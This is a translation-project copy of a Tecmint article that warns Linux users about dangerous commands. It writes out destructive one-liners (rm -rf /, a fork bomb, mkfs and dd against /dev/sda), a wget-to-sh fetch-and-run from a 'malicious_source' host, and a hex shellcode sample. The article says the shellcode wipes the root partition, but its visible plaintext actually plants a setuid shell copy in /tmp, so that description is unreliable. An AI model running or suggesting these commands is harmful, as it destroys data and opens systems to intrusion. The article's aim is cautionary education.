                            翻译中  Luox
10 Most Dangerous Commands – You Should Never Execute on Linux
================================================================================
Linux command line is productive, useful and interesting but sometimes it may be very much dangerous specially when you are not sure what you are doing. This article is not intended to make you furious of **Linux** or **Linux command** line. We just want to make you aware of some of the commands which you should think twice before you execute them.

![](http://www.tecmint.com/wp-content/uploads/2013/11/Dangerous-Linux-Commands.png)

### 1. rm -rf Command ###

The **rm -rf** command is one of the fastest way to delete a folder and its contents. But a little typo or ignorance may result into unrecoverable system damage. The some of options used with **rm command** are.

- **rm** command in Linux is used to delete files.
- **rm -r** command deletes the folder recursively, even the empty folder.
- **rm -f** command removes ‘Read only File’ without asking.
- **rm -rf /** : Force deletion of everything in root directory.
- **rm -rf ** *  : Force deletion of everything in current directory/working directory.
- **rm -rf .** : Force deletion of current folder and sub folders.

Hence, be careful when you are executing **rm -rf** command. To overcome accidental delete of file by ‘**rm**‘ command, create an alias of ‘**rm**‘ command as ‘**rm -i**‘ in “**.bashrc**” file, it will ask you to confirm every deletion.

### 2. :(){:|:&};: Command ###

The above is actually a **fork bomb**. It operates by defining a function called ‘:‘, which calls itself twice, once in the foreground and once in the background. It keeps on executing again and again till the system freezes.

    :(){:|:&};:

### 3. command > /dev/sda ###

The above command writes the output of ‘**command**‘ on the block **/dev/sda**. The above command writes raw data and all the files on the block will be replaced with raw data, thus resulting in total loss of data on the block.

### 4. mv folder /dev/null ###

The above command will move ‘**folder**‘ to **/dev/null**. In Linux **/dev/null** or **null** device is a special file that discards all the data written to it and reports that write operation succeed.

    # mv /home/user/* /dev/null

The above command will move all the contents of a **User** directory to **/dev/null**, which literally means everything there was sent to **blackhole (null)**.

### 5. wget http://malicious_source -O- | sh ###

The above command will download a script from a malicious source and then execute it. Wget command will download the script and **sh** will execute the downloaded script.

**Note**: You should be very much aware of the source from where you are downloading packages and scripts. Only use those scripts/applications which is downloaded from a trusted source.

### 6. mkfs.ext3 /dev/sda ###

The above command will format the block ‘**sda**’ and you would surely be knowing that after execution of the above command your Block (**Hard Disk Drive**) would be new, **BRAND NEW!** Without any data, leaving your system into unrecoverable stage.

### 7. > file ###

The above command is used to flush the content of file. If the above command is executed with a typo or ignorance like “> **xt.conf**” will write the configuration file or any other system or configuration file.

### 8. ^foo^bar ###

This command, as described in our [10 Lesser Known Linux Commands][1], is used to edit the previous run command without the need of retyping the whole command again. But this can really be troublesome if you didn’t took the risk of thoroughly checking the change in original command using **^foo^bar** command.

### 9. dd if=/dev/random of=/dev/sda ###

The above command will wipe out the block **sda** and write random junk data to the block. Of-course! Your system would be left at inconsistent and unrecoverable stage.

### 10. Hidden the Command ###

The below command is nothing but the first command above (**rm -rf**). Here the codes are hidden in **hex** so that an ignorant user may be fooled. Running the below code in your terminal will wipe your **root** partition.

This command here shows that the threat may be hidden and not normally detectable sometimes. You must be aware of what you are doing and what would be the result. Don’t compile/run codes from an unknown source.

    char esp[] __attribute__ ((section(“.text”))) /* e.s.p
    release */
    = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
    “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
    “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
    “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
    “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
    “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
    “\x6e\x2f\x73\x68\x00\x2d\x63\x00″
    “cp -p /bin/sh /tmp/.beyond; chmod 4755
    /tmp/.beyond;”;

**Note**: Don’t execute any of the above command in your **Linux** terminal or shell or of your friend or school computer. If you want to test them, run them in virtual machine. Any in-consistence or data loss, due to the execution of above command will break your system down for which, neither the **Author** of the article nor **Tecmint** is responsible.

That’s all for now. I will soon be here again with another interesting article you people will love to read. Till then Stay tuned and connected to **Tecmint**. If you know any other such **Dangerous Linux Commands** and you would like us to add to the list, please tell us via comment section and don’t forgot to give your value-able feedback.


--------------------------------------------------------------------------------

via: http://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/

译者：[译者ID](https://github.com/译者ID) 校对：[校对者ID](https://github.com/校对者ID)

本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创翻译，[Linux中国](http://linux.cn/) 荣誉推出

[1]:http://www.tecmint.com/10-lesser-known-commands-for-linux-part-3/
[2]:
[3]:
[4]:
[5]:
[6]:
[7]:
[8]:
[9]:
[10]:
[11]:
[12]:
